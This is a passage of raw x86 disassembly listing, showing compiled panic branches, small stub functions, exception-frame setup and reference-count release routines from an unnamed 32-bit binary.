  403da7:	e8 88 80 02 00       	call   0x42be34
  403dac:	83 c4 0c             	add    $0xc,%esp
  403daf:	e9 08 02 00 00       	jmp    0x403fbc
  403db4:	68 8c d4 42 00       	push   $0x42d48c
  403db9:	57                   	push   %edi
  403dba:	50                   	push   %eax
  403dbb:	e8 74 80 02 00       	call   0x42be34
  403dc0:	83 c4 0c             	add    $0xc,%esp
  403dc3:	e9 f4 01 00 00       	jmp    0x403fbc
  403dc8:	68 68 d5 42 00       	push   $0x42d568
  403dcd:	57                   	push   %edi
  403dce:	50                   	push   %eax
  403dcf:	e8 60 80 02 00       	call   0x42be34
  403dd4:	83 c4 0c             	add    $0xc,%esp
  403dd7:	e9 e0 01 00 00       	jmp    0x403fbc
  403ddc:	68 78 d5 42 00       	push   $0x42d578
  403de1:	57                   	push   %edi
  403de2:	50                   	push   %eax
  403de3:	e8 4c 80 02 00       	call   0x42be34
  403de8:	83 c4 0c             	add    $0xc,%esp
  403deb:	e9 cc 01 00 00       	jmp    0x403fbc
  403df0:	68 bc d3 42 00       	push   $0x42d3bc
  403df5:	57                   	push   %edi
  403df6:	50                   	push   %eax
  403df7:	e8 38 80 02 00       	call   0x42be34
  403dfc:	83 c4 0c             	add    $0xc,%esp
  403dff:	e9 b8 01 00 00       	jmp    0x403fbc
  403e04:	68 9c d4 42 00       	push   $0x42d49c
  403e09:	57                   	push   %edi
  403e0a:	ff 76 08             	push   0x8(%esi)
  403e0d:	e8 22 80 02 00       	call   0x42be34
  403e12:	83 c4 0c             	add    $0xc,%esp
  403e15:	e9 a2 01 00 00       	jmp    0x403fbc
  403e1a:	68 88 d5 42 00       	push   $0x42d588
  403e1f:	57                   	push   %edi
  403e20:	50                   	push   %eax
  403e21:	e8 0e 80 02 00       	call   0x42be34
  403e26:	83 c4 0c             	add    $0xc,%esp
  403e29:	e9 8e 01 00 00       	jmp    0x403fbc
  403e2e:	68 cc d3 42 00       	push   $0x42d3cc
  403e33:	57                   	push   %edi
  403e34:	50                   	push   %eax
  403e35:	e8 fa 7f 02 00       	call   0x42be34
  403e3a:	83 c4 0c             	add    $0xc,%esp
  403e3d:	e9 7a 01 00 00       	jmp    0x403fbc
  403e42:	68 ac d4 42 00       	push   $0x42d4ac
  403e47:	ff 76 18             	push   0x18(%esi)
  403e4a:	ff 76 14             	push   0x14(%esi)
  403e4d:	e8 e2 7f 02 00       	call   0x42be34
  403e52:	83 c4 0c             	add    $0xc,%esp
  403e55:	e9 62 01 00 00       	jmp    0x403fbc
  403e5a:	68 dc d3 42 00       	push   $0x42d3dc
  403e5f:	57                   	push   %edi
  403e60:	50                   	push   %eax
  403e61:	e8 ce 7f 02 00       	call   0x42be34
  403e66:	83 c4 0c             	add    $0xc,%esp
  403e69:	e9 4e 01 00 00       	jmp    0x403fbc
  403e6e:	68 98 d5 42 00       	push   $0x42d598
  403e73:	57                   	push   %edi
  403e74:	50                   	push   %eax
  403e75:	e8 ba 7f 02 00       	call   0x42be34
  403e7a:	83 c4 0c             	add    $0xc,%esp
  403e7d:	e9 3a 01 00 00       	jmp    0x403fbc
  403e82:	68 ec d3 42 00       	push   $0x42d3ec
  403e87:	57                   	push   %edi
  403e88:	50                   	push   %eax
  403e89:	e8 a6 7f 02 00       	call   0x42be34
  403e8e:	83 c4 0c             	add    $0xc,%esp
  403e91:	e9 26 01 00 00       	jmp    0x403fbc
  403e96:	68 c8 d4 42 00       	push   $0x42d4c8
  403e9b:	57                   	push   %edi
  403e9c:	50                   	push   %eax
  403e9d:	e8 92 7f 02 00       	call   0x42be34
  403ea2:	83 c4 0c             	add    $0xc,%esp
  403ea5:	e9 12 01 00 00       	jmp    0x403fbc
  403eaa:	68 a8 d5 42 00       	push   $0x42d5a8
  403eaf:	57                   	push   %edi
  403eb0:	50                   	push   %eax
  403eb1:	e8 7e 7f 02 00       	call   0x42be34
  403eb6:	83 c4 0c             	add    $0xc,%esp
  403eb9:	e9 fe 00 00 00       	jmp    0x403fbc
  403ebe:	68 fc d3 42 00       	push   $0x42d3fc
  403ec3:	57                   	push   %edi
  403ec4:	50                   	push   %eax
  403ec5:	e8 6a 7f 02 00       	call   0x42be34
  403eca:	83 c4 0c             	add    $0xc,%esp
  403ecd:	e9 ea 00 00 00       	jmp    0x403fbc
  403ed2:	68 d8 d4 42 00       	push   $0x42d4d8
  403ed7:	57                   	push   %edi
  403ed8:	50                   	push   %eax
  403ed9:	e8 56 7f 02 00       	call   0x42be34
  403ede:	83 c4 0c             	add    $0xc,%esp
  403ee1:	e9 d6 00 00 00       	jmp    0x403fbc
  403ee6:	68 b8 d5 42 00       	push   $0x42d5b8
  403eeb:	57                   	push   %edi
  403eec:	50                   	push   %eax
  403eed:	e8 42 7f 02 00       	call   0x42be34
  403ef2:	83 c4 0c             	add    $0xc,%esp
  403ef5:	e9 c2 00 00 00       	jmp    0x403fbc
  403efa:	68 0c d4 42 00       	push   $0x42d40c
  403eff:	57                   	push   %edi
  403f00:	50                   	push   %eax
  403f01:	e8 2e 7f 02 00       	call   0x42be34
  403f06:	83 c4 0c             	add    $0xc,%esp
  403f09:	e9 ae 00 00 00       	jmp    0x403fbc
  403f0e:	68 e8 d4 42 00       	push   $0x42d4e8
  403f13:	57                   	push   %edi
  403f14:	50                   	push   %eax
  403f15:	e8 1a 7f 02 00       	call   0x42be34
  403f1a:	83 c4 0c             	add    $0xc,%esp
  403f1d:	e9 9a 00 00 00       	jmp    0x403fbc
  403f22:	68 c8 d5 42 00       	push   $0x42d5c8
  403f27:	57                   	push   %edi
  403f28:	50                   	push   %eax
  403f29:	e8 06 7f 02 00       	call   0x42be34
  403f2e:	83 c4 0c             	add    $0xc,%esp
  403f31:	e9 86 00 00 00       	jmp    0x403fbc
  403f36:	68 b0 d8 42 00       	push   $0x42d8b0
  403f3b:	50                   	push   %eax
  403f3c:	52                   	push   %edx
  403f3d:	e8 f2 7e 02 00       	call   0x42be34
  403f42:	83 c4 0c             	add    $0xc,%esp
  403f45:	eb 75                	jmp    0x403fbc
  403f47:	68 40 d8 42 00       	push   $0x42d840
  403f4c:	52                   	push   %edx
  403f4d:	50                   	push   %eax
  403f4e:	e8 e1 7e 02 00       	call   0x42be34
  403f53:	83 c4 0c             	add    $0xc,%esp
  403f56:	eb 64                	jmp    0x403fbc
  403f58:	68 50 d8 42 00       	push   $0x42d850
  403f5d:	52                   	push   %edx
  403f5e:	57                   	push   %edi
  403f5f:	e8 d0 7e 02 00       	call   0x42be34
  403f64:	83 c4 0c             	add    $0xc,%esp
  403f67:	eb 53                	jmp    0x403fbc
  403f69:	68 60 d8 42 00       	push   $0x42d860
  403f6e:	50                   	push   %eax
  403f6f:	51                   	push   %ecx
  403f70:	e8 bf 7e 02 00       	call   0x42be34
  403f75:	83 c4 0c             	add    $0xc,%esp
  403f78:	eb 42                	jmp    0x403fbc
  403f7a:	68 70 d8 42 00       	push   $0x42d870
  403f7f:	50                   	push   %eax
  403f80:	52                   	push   %edx
  403f81:	e8 ae 7e 02 00       	call   0x42be34
  403f86:	83 c4 0c             	add    $0xc,%esp
  403f89:	eb 31                	jmp    0x403fbc
  403f8b:	68 80 d8 42 00       	push   $0x42d880
  403f90:	52                   	push   %edx
  403f91:	50                   	push   %eax
  403f92:	e8 9d 7e 02 00       	call   0x42be34
  403f97:	83 c4 0c             	add    $0xc,%esp
  403f9a:	eb 20                	jmp    0x403fbc
  403f9c:	68 90 d8 42 00       	push   $0x42d890
  403fa1:	52                   	push   %edx
  403fa2:	57                   	push   %edi
  403fa3:	e8 8c 7e 02 00       	call   0x42be34
  403fa8:	83 c4 0c             	add    $0xc,%esp
  403fab:	eb 0f                	jmp    0x403fbc
  403fad:	68 a0 d8 42 00       	push   $0x42d8a0
  403fb2:	50                   	push   %eax
  403fb3:	51                   	push   %ecx
  403fb4:	e8 7b 7e 02 00       	call   0x42be34
  403fb9:	83 c4 0c             	add    $0xc,%esp
  403fbc:	0f 0b                	ud2
  403fbe:	55                   	push   %ebp
  403fbf:	83 ec 18             	sub    $0x18,%esp
  403fc2:	8d b5 b4 f6 ff ff    	lea    -0x94c(%ebp),%esi
  403fc8:	8b ae 38 09 00 00    	mov    0x938(%esi),%ebp
  403fce:	8d 8e e0 00 00 00    	lea    0xe0(%esi),%ecx
  403fd4:	e8 24 03 00 00       	call   0x4042fd
  403fd9:	83 c4 18             	add    $0x18,%esp
  403fdc:	5d                   	pop    %ebp
  403fdd:	c3                   	ret
  403fde:	55                   	push   %ebp
  403fdf:	83 ec 18             	sub    $0x18,%esp
  403fe2:	8d b5 b4 f6 ff ff    	lea    -0x94c(%ebp),%esi
  403fe8:	8b ae 38 09 00 00    	mov    0x938(%esi),%ebp
  403fee:	8d 4e 38             	lea    0x38(%esi),%ecx
  403ff1:	e8 07 03 00 00       	call   0x4042fd
  403ff6:	83 c4 18             	add    $0x18,%esp
  403ff9:	5d                   	pop    %ebp
  403ffa:	c3                   	ret
  403ffb:	55                   	push   %ebp
  403ffc:	83 ec 18             	sub    $0x18,%esp
  403fff:	8d b5 b4 f6 ff ff    	lea    -0x94c(%ebp),%esi
  404005:	8b ae 38 09 00 00    	mov    0x938(%esi),%ebp
  40400b:	8d 8e e0 00 00 00    	lea    0xe0(%esi),%ecx
  404011:	e8 e7 02 00 00       	call   0x4042fd
  404016:	83 c4 18             	add    $0x18,%esp
  404019:	5d                   	pop    %ebp
  40401a:	c3                   	ret
  40401b:	55                   	push   %ebp
  40401c:	83 ec 18             	sub    $0x18,%esp
  40401f:	8d b5 b4 f6 ff ff    	lea    -0x94c(%ebp),%esi
  404025:	8b ae 38 09 00 00    	mov    0x938(%esi),%ebp
  40402b:	8b 86 88 00 00 00    	mov    0x88(%esi),%eax
  404031:	f2 0f 10 86 80 00 00 	movsd  0x80(%esi),%xmm0
  404038:	00 
  404039:	89 46 68             	mov    %eax,0x68(%esi)
  40403c:	f2 0f 11 46 60       	movsd  %xmm0,0x60(%esi)
  404041:	83 c4 18             	add    $0x18,%esp
  404044:	5d                   	pop    %ebp
  404045:	c3                   	ret
  404046:	55                   	push   %ebp
  404047:	83 ec 18             	sub    $0x18,%esp
  40404a:	8d b5 b4 f6 ff ff    	lea    -0x94c(%ebp),%esi
  404050:	8b ae 38 09 00 00    	mov    0x938(%esi),%ebp
  404056:	8b 46 28             	mov    0x28(%esi),%eax
  404059:	8b 40 04             	mov    0x4(%eax),%eax
  40405c:	85 c0                	test   %eax,%eax
  40405e:	74 12                	je     0x404072
  404060:	8b 4e 28             	mov    0x28(%esi),%ecx
  404063:	ff 71 08             	push   0x8(%ecx)
  404066:	50                   	push   %eax
  404067:	ff 76 04             	push   0x4(%esi)
  40406a:	e8 0a 28 00 00       	call   0x406879
  40406f:	83 c4 0c             	add    $0xc,%esp
  404072:	c6 46 13 00          	movb   $0x0,0x13(%esi)
  404076:	83 c4 18             	add    $0x18,%esp
  404079:	5d                   	pop    %ebp
  40407a:	c3                   	ret
  40407b:	55                   	push   %ebp
  40407c:	83 ec 18             	sub    $0x18,%esp
  40407f:	8d b5 b4 f6 ff ff    	lea    -0x94c(%ebp),%esi
  404085:	8b ae 38 09 00 00    	mov    0x938(%esi),%ebp
  40408b:	80 7e 13 00          	cmpb   $0x0,0x13(%esi)
  40408f:	74 10                	je     0x4040a1
  404091:	8d 8e e0 00 00 00    	lea    0xe0(%esi),%ecx
  404097:	e8 49 03 00 00       	call   0x4043e5
  40409c:	83 c4 18             	add    $0x18,%esp
  40409f:	5d                   	pop    %ebp
  4040a0:	c3                   	ret
  4040a1:	83 c4 18             	add    $0x18,%esp
  4040a4:	5d                   	pop    %ebp
  4040a5:	c3                   	ret
  4040a6:	55                   	push   %ebp
  4040a7:	83 ec 18             	sub    $0x18,%esp
  4040aa:	8d b5 b4 f6 ff ff    	lea    -0x94c(%ebp),%esi
  4040b0:	8b ae 38 09 00 00    	mov    0x938(%esi),%ebp
  4040b6:	83 7e 38 00          	cmpl   $0x0,0x38(%esi)
  4040ba:	75 0d                	jne    0x4040c9
  4040bc:	8d 4e 38             	lea    0x38(%esi),%ecx
  4040bf:	e8 61 01 00 00       	call   0x404225
  4040c4:	83 c4 18             	add    $0x18,%esp
  4040c7:	5d                   	pop    %ebp
  4040c8:	c3                   	ret
  4040c9:	83 c4 18             	add    $0x18,%esp
  4040cc:	5d                   	pop    %ebp
  4040cd:	c3                   	ret
  4040ce:	55                   	push   %ebp
  4040cf:	83 ec 18             	sub    $0x18,%esp
  4040d2:	8d b5 b4 f6 ff ff    	lea    -0x94c(%ebp),%esi
  4040d8:	8b ae 38 09 00 00    	mov    0x938(%esi),%ebp
  4040de:	8d 4e 38             	lea    0x38(%esi),%ecx
  4040e1:	e8 17 02 00 00       	call   0x4042fd
  4040e6:	83 c4 18             	add    $0x18,%esp
  4040e9:	5d                   	pop    %ebp
  4040ea:	c3                   	ret
  4040eb:	55                   	push   %ebp
  4040ec:	83 ec 18             	sub    $0x18,%esp
  4040ef:	8d b5 b4 f6 ff ff    	lea    -0x94c(%ebp),%esi
  4040f5:	8b ae 38 09 00 00    	mov    0x938(%esi),%ebp
  4040fb:	8d 8e d4 00 00 00    	lea    0xd4(%esi),%ecx
  404101:	e8 f7 01 00 00       	call   0x4042fd
  404106:	83 c4 18             	add    $0x18,%esp
  404109:	5d                   	pop    %ebp
  40410a:	c3                   	ret
  40410b:	55                   	push   %ebp
  40410c:	83 ec 18             	sub    $0x18,%esp
  40410f:	8d b5 b4 f6 ff ff    	lea    -0x94c(%ebp),%esi
  404115:	8b ae 38 09 00 00    	mov    0x938(%esi),%ebp
  40411b:	8d 8e e0 00 00 00    	lea    0xe0(%esi),%ecx
  404121:	e8 d7 01 00 00       	call   0x4042fd
  404126:	83 c4 18             	add    $0x18,%esp
  404129:	5d                   	pop    %ebp
  40412a:	c3                   	ret
  40412b:	55                   	push   %ebp
  40412c:	83 ec 18             	sub    $0x18,%esp
  40412f:	8d b5 b4 f6 ff ff    	lea    -0x94c(%ebp),%esi
  404135:	8b ae 38 09 00 00    	mov    0x938(%esi),%ebp
  40413b:	8d 8e e0 00 00 00    	lea    0xe0(%esi),%ecx
  404141:	e8 b7 01 00 00       	call   0x4042fd
  404146:	83 c4 18             	add    $0x18,%esp
  404149:	5d                   	pop    %ebp
  40414a:	c3                   	ret
  40414b:	55                   	push   %ebp
  40414c:	83 ec 18             	sub    $0x18,%esp
  40414f:	8d b5 b4 f6 ff ff    	lea    -0x94c(%ebp),%esi
  404155:	8b ae 38 09 00 00    	mov    0x938(%esi),%ebp
  40415b:	8d 4e 38             	lea    0x38(%esi),%ecx
  40415e:	e8 9a 01 00 00       	call   0x4042fd
  404163:	83 c4 18             	add    $0x18,%esp
  404166:	5d                   	pop    %ebp
  404167:	c3                   	ret
  404168:	55                   	push   %ebp
  404169:	83 ec 18             	sub    $0x18,%esp
  40416c:	8d b5 b4 f6 ff ff    	lea    -0x94c(%ebp),%esi
  404172:	8b ae 38 09 00 00    	mov    0x938(%esi),%ebp
  404178:	8d 8e e0 00 00 00    	lea    0xe0(%esi),%ecx
  40417e:	e8 7a 01 00 00       	call   0x4042fd
  404183:	83 c4 18             	add    $0x18,%esp
  404186:	5d                   	pop    %ebp
  404187:	c3                   	ret
  404188:	55                   	push   %ebp
  404189:	83 ec 18             	sub    $0x18,%esp
  40418c:	8d b5 b4 f6 ff ff    	lea    -0x94c(%ebp),%esi
  404192:	8b ae 38 09 00 00    	mov    0x938(%esi),%ebp
  404198:	8d 8e c8 00 00 00    	lea    0xc8(%esi),%ecx
  40419e:	e8 5a 01 00 00       	call   0x4042fd
  4041a3:	83 c4 18             	add    $0x18,%esp
  4041a6:	5d                   	pop    %ebp
  4041a7:	c3                   	ret
  4041a8:	55                   	push   %ebp
  4041a9:	83 ec 18             	sub    $0x18,%esp
  4041ac:	8d b5 b4 f6 ff ff    	lea    -0x94c(%ebp),%esi
  4041b2:	8b ae 38 09 00 00    	mov    0x938(%esi),%ebp
  4041b8:	8d 8e e0 04 00 00    	lea    0x4e0(%esi),%ecx
  4041be:	e8 3a 01 00 00       	call   0x4042fd
  4041c3:	83 c4 18             	add    $0x18,%esp
  4041c6:	5d                   	pop    %ebp
  4041c7:	c3                   	ret
  4041c8:	55                   	push   %ebp
  4041c9:	83 ec 18             	sub    $0x18,%esp
  4041cc:	8d b5 b4 f6 ff ff    	lea    -0x94c(%ebp),%esi
  4041d2:	8b ae 38 09 00 00    	mov    0x938(%esi),%ebp
  4041d8:	8d 4e 60             	lea    0x60(%esi),%ecx
  4041db:	e8 1d 01 00 00       	call   0x4042fd
  4041e0:	83 c4 18             	add    $0x18,%esp
  4041e3:	5d                   	pop    %ebp
  4041e4:	c3                   	ret
  4041e5:	55                   	push   %ebp
  4041e6:	83 ec 18             	sub    $0x18,%esp
  4041e9:	8d b5 b4 f6 ff ff    	lea    -0x94c(%ebp),%esi
  4041ef:	8b ae 38 09 00 00    	mov    0x938(%esi),%ebp
  4041f5:	8d 8e e0 04 00 00    	lea    0x4e0(%esi),%ecx
  4041fb:	e8 fd 00 00 00       	call   0x4042fd
  404200:	83 c4 18             	add    $0x18,%esp
  404203:	5d                   	pop    %ebp
  404204:	c3                   	ret
  404205:	55                   	push   %ebp
  404206:	83 ec 18             	sub    $0x18,%esp
  404209:	8d b5 b4 f6 ff ff    	lea    -0x94c(%ebp),%esi
  40420f:	8b ae 38 09 00 00    	mov    0x938(%esi),%ebp
  404215:	8d 8e 80 00 00 00    	lea    0x80(%esi),%ecx
  40421b:	e8 dd 00 00 00       	call   0x4042fd
  404220:	83 c4 18             	add    $0x18,%esp
  404223:	5d                   	pop    %ebp
  404224:	c3                   	ret
  404225:	83 39 00             	cmpl   $0x0,(%ecx)
  404228:	74 05                	je     0x40422f
  40422a:	e9 b6 01 00 00       	jmp    0x4043e5
  40422f:	83 c1 04             	add    $0x4,%ecx
  404232:	e9 00 00 00 00       	jmp    0x404237
  404237:	55                   	push   %ebp
  404238:	89 e5                	mov    %esp,%ebp
  40423a:	53                   	push   %ebx
  40423b:	57                   	push   %edi
  40423c:	56                   	push   %esi
  40423d:	83 ec 1c             	sub    $0x1c,%esp
  404240:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404243:	89 60 fc             	mov    %esp,-0x4(%eax)
  404246:	c7 40 08 ff ff ff ff 	movl   $0xffffffff,0x8(%eax)
  40424d:	c7 40 04 20 45 40 00 	movl   $0x404520,0x4(%eax)
  404254:	64 8b 15 00 00 00 00 	mov    %fs:0x0,%edx
  40425b:	89 10                	mov    %edx,(%eax)
  40425d:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  404263:	80 39 03             	cmpb   $0x3,(%ecx)
  404266:	75 4f                	jne    0x4042b7
  404268:	8b 41 04             	mov    0x4(%ecx),%eax
  40426b:	8b 08                	mov    (%eax),%ecx
  40426d:	89 45 d8             	mov    %eax,-0x28(%ebp)
  404270:	8b 40 04             	mov    0x4(%eax),%eax
  404273:	89 45 e0             	mov    %eax,-0x20(%ebp)
  404276:	8b 00                	mov    (%eax),%eax
  404278:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  40427b:	85 c0                	test   %eax,%eax
  40427d:	74 0f                	je     0x40428e
  40427f:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  404286:	ff 75 dc             	push   -0x24(%ebp)
  404289:	ff d0                	call   *%eax
  40428b:	83 c4 04             	add    $0x4,%esp
  40428e:	8b 55 e0             	mov    -0x20(%ebp),%edx
  404291:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  404294:	8b 42 04             	mov    0x4(%edx),%eax
  404297:	85 c0                	test   %eax,%eax
  404299:	74 0d                	je     0x4042a8
  40429b:	ff 72 08             	push   0x8(%edx)
  40429e:	50                   	push   %eax
  40429f:	51                   	push   %ecx
  4042a0:	e8 d4 25 00 00       	call   0x406879
  4042a5:	83 c4 0c             	add    $0xc,%esp
  4042a8:	6a 04                	push   $0x4
  4042aa:	6a 0c                	push   $0xc
  4042ac:	ff 75 d8             	push   -0x28(%ebp)
  4042af:	e8 c5 25 00 00       	call   0x406879
  4042b4:	83 c4 0c             	add    $0xc,%esp
  4042b7:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4042ba:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4042c0:	83 c4 1c             	add    $0x1c,%esp
  4042c3:	5e                   	pop    %esi
  4042c4:	5f                   	pop    %edi
  4042c5:	5b                   	pop    %ebx
  4042c6:	5d                   	pop    %ebp
  4042c7:	c3                   	ret
  4042c8:	55                   	push   %ebp
  4042c9:	83 ec 0c             	sub    $0xc,%esp
  4042cc:	83 c5 0c             	add    $0xc,%ebp
  4042cf:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4042d2:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4042d5:	8b 40 04             	mov    0x4(%eax),%eax
  4042d8:	85 c0                	test   %eax,%eax
  4042da:	74 10                	je     0x4042ec
  4042dc:	8b 55 e0             	mov    -0x20(%ebp),%edx
  4042df:	ff 72 08             	push   0x8(%edx)
  4042e2:	50                   	push   %eax
  4042e3:	51                   	push   %ecx
  4042e4:	e8 90 25 00 00       	call   0x406879
  4042e9:	83 c4 0c             	add    $0xc,%esp
  4042ec:	6a 04                	push   $0x4
  4042ee:	6a 0c                	push   $0xc
  4042f0:	ff 75 d8             	push   -0x28(%ebp)
  4042f3:	e8 81 25 00 00       	call   0x406879
  4042f8:	83 c4 18             	add    $0x18,%esp
  4042fb:	5d                   	pop    %ebp
  4042fc:	c3                   	ret
  4042fd:	55                   	push   %ebp
  4042fe:	89 e5                	mov    %esp,%ebp
  404300:	53                   	push   %ebx
  404301:	57                   	push   %edi
  404302:	56                   	push   %esi
  404303:	83 ec 14             	sub    $0x14,%esp
  404306:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404309:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  40430c:	89 60 fc             	mov    %esp,-0x4(%eax)
  40430f:	c7 40 08 ff ff ff ff 	movl   $0xffffffff,0x8(%eax)
  404316:	c7 40 04 30 45 40 00 	movl   $0x404530,0x4(%eax)
  40431d:	64 8b 15 00 00 00 00 	mov    %fs:0x0,%edx
  404324:	89 10                	mov    %edx,(%eax)
  404326:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40432c:	c7 40 08 00 00 00 00 	movl   $0x0,0x8(%eax)
  404333:	51                   	push   %ecx
  404334:	e8 68 0e 00 00       	call   0x4051a1
  404339:	83 c4 04             	add    $0x4,%esp
  40433c:	c7 45 f0 ff ff ff ff 	movl   $0xffffffff,-0x10(%ebp)
  404343:	ff 75 e0             	push   -0x20(%ebp)
  404346:	e8 41 08 00 00       	call   0x404b8c
  40434b:	83 c4 04             	add    $0x4,%esp
  40434e:	8b 45 e8             	mov    -0x18(%ebp),%eax
  404351:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  404357:	83 c4 14             	add    $0x14,%esp
  40435a:	5e                   	pop    %esi
  40435b:	5f                   	pop    %edi
  40435c:	5b                   	pop    %ebx
  40435d:	5d                   	pop    %ebp
  40435e:	c3                   	ret
  40435f:	55                   	push   %ebp
  404360:	50                   	push   %eax
  404361:	83 c5 0c             	add    $0xc,%ebp
  404364:	ff 75 e0             	push   -0x20(%ebp)
  404367:	e8 20 08 00 00       	call   0x404b8c
  40436c:	83 c4 08             	add    $0x8,%esp
  40436f:	5d                   	pop    %ebp
  404370:	c3                   	ret
  404371:	55                   	push   %ebp
  404372:	89 e5                	mov    %esp,%ebp
  404374:	53                   	push   %ebx
  404375:	57                   	push   %edi
  404376:	56                   	push   %esi
  404377:	83 ec 14             	sub    $0x14,%esp
  40437a:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40437d:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  404380:	89 60 fc             	mov    %esp,-0x4(%eax)
  404383:	c7 40 08 ff ff ff ff 	movl   $0xffffffff,0x8(%eax)
  40438a:	c7 40 04 40 45 40 00 	movl   $0x404540,0x4(%eax)
  404391:	64 8b 15 00 00 00 00 	mov    %fs:0x0,%edx
  404398:	89 10                	mov    %edx,(%eax)
  40439a:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4043a0:	c7 40 08 00 00 00 00 	movl   $0x0,0x8(%eax)
  4043a7:	51                   	push   %ecx
  4043a8:	e8 f4 0d 00 00       	call   0x4051a1
  4043ad:	83 c4 04             	add    $0x4,%esp
  4043b0:	c7 45 f0 ff ff ff ff 	movl   $0xffffffff,-0x10(%ebp)
  4043b7:	ff 75 e0             	push   -0x20(%ebp)
  4043ba:	e8 b9 07 00 00       	call   0x404b78
  4043bf:	83 c4 04             	add    $0x4,%esp
  4043c2:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4043c5:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4043cb:	83 c4 14             	add    $0x14,%esp
  4043ce:	5e                   	pop    %esi
  4043cf:	5f                   	pop    %edi
  4043d0:	5b                   	pop    %ebx
  4043d1:	5d                   	pop    %ebp
  4043d2:	c3                   	ret
  4043d3:	55                   	push   %ebp
  4043d4:	50                   	push   %eax
  4043d5:	83 c5 0c             	add    $0xc,%ebp
  4043d8:	ff 75 e0             	push   -0x20(%ebp)
  4043db:	e8 98 07 00 00       	call   0x404b78
  4043e0:	83 c4 08             	add    $0x8,%esp
  4043e3:	5d                   	pop    %ebp
  4043e4:	c3                   	ret
  4043e5:	55                   	push   %ebp
  4043e6:	89 e5                	mov    %esp,%ebp
  4043e8:	53                   	push   %ebx
  4043e9:	57                   	push   %edi
  4043ea:	56                   	push   %esi
  4043eb:	83 ec 14             	sub    $0x14,%esp
  4043ee:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4043f1:	89 ce                	mov    %ecx,%esi
  4043f3:	89 60 fc             	mov    %esp,-0x4(%eax)
  4043f6:	c7 40 08 ff ff ff ff 	movl   $0xffffffff,0x8(%eax)
  4043fd:	c7 40 04 50 45 40 00 	movl   $0x404550,0x4(%eax)
  404404:	64 8b 0d 00 00 00 00 	mov    %fs:0x0,%ecx
  40440b:	89 08                	mov    %ecx,(%eax)
  40440d:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  404413:	ff 76 08             	push   0x8(%esi)
  404416:	e8 21 7b 01 00       	call   0x41bf3c
  40441b:	8b 06                	mov    (%esi),%eax
  40441d:	89 75 e0             	mov    %esi,-0x20(%ebp)
  404420:	f0 ff 08             	lock decl (%eax)
  404423:	75 12                	jne    0x404437
  404425:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  40442c:	ff 75 e0             	push   -0x20(%ebp)
  40442f:	e8 ac c6 00 00       	call   0x410ae0
  404434:	83 c4 04             	add    $0x4,%esp
  404437:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40443a:	8b 40 04             	mov    0x4(%eax),%eax
  40443d:	f0 ff 08             	lock decl (%eax)
  404440:	75 16                	jne    0x404458
  404442:	8b 45 e0             	mov    -0x20(%ebp),%eax
  404445:	c7 45 f0 ff ff ff ff 	movl   $0xffffffff,-0x10(%ebp)
  40444c:	83 c0 04             	add    $0x4,%eax
  40444f:	50                   	push   %eax
  404450:	e8 5b c7 00 00       	call   0x410bb0
  404455:	83 c4 04             	add    $0x4,%esp
  404458:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40445b:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  404461:	83 c4 14             	add    $0x14,%esp
  404464:	5e                   	pop    %esi
  404465:	5f                   	pop    %edi
  404466:	5b                   	pop    %ebx
  404467:	5d                   	pop    %ebp
  404468:	c3                   	ret
  404469:	55                   	push   %ebp
  40446a:	50                   	push   %eax
  40446b:	83 c5 0c             	add    $0xc,%ebp
  40446e:	8b 45 e0             	mov    -0x20(%ebp),%eax
  404471:	8b 40 04             	mov    0x4(%eax),%eax
  404474:	f0 ff 08             	lock decl (%eax)
  404477:	75 0f                	jne    0x404488
  404479:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40447c:	83 c0 04             	add    $0x4,%eax
  40447f:	50                   	push   %eax
  404480:	e8 2b c7 00 00       	call   0x410bb0
  404485:	83 c4 04             	add    $0x4,%esp
  404488:	83 c4 04             	add    $0x4,%esp
  40448b:	5d                   	pop    %ebp
  40448c:	c3                   	ret
  40448d:	80 39 04             	cmpb   $0x4,(%ecx)
  404490:	0f 85 a1 fd ff ff    	jne    0x404237
  404496:	ff 71 04             	push   0x4(%ecx)
  404499:	e8 9e 7a 01 00       	call   0x41bf3c
  40449e:	c3                   	ret
  40449f:	50                   	push   %eax
  4044a0:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4044a4:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4044a8:	89 e2                	mov    %esp,%edx
  4044aa:	89 0a                	mov    %ecx,(%edx)
  4044ac:	68 88 5b 92 00       	push   $0x925b88
  4044b1:	52                   	push   %edx
  4044b2:	6a 08                	push   $0x8
  4044b4:	68 98 5b 92 00       	push   $0x925b98
  4044b9:	50                   	push   %eax
  4044ba:	e8 d1 58 01 00       	call   0x419d90
  4044bf:	83 c4 14             	add    $0x14,%esp
  4044c2:	59                   	pop    %ecx
  4044c3:	c3                   	ret
  4044c4:	cc                   	int3
  4044c5:	cc                   	int3
  4044c6:	cc                   	int3
  4044c7:	cc                   	int3
  4044c8:	cc                   	int3
  4044c9:	cc                   	int3
  4044ca:	cc                   	int3
  4044cb:	cc                   	int3
  4044cc:	cc                   	int3
  4044cd:	cc                   	int3
  4044ce:	cc                   	int3
  4044cf:	cc                   	int3
  4044d0:	6a 00                	push   $0x0
  4044d2:	ff 74 24 0c          	push   0xc(%esp)
  4044d6:	ff 74 24 0c          	push   0xc(%esp)
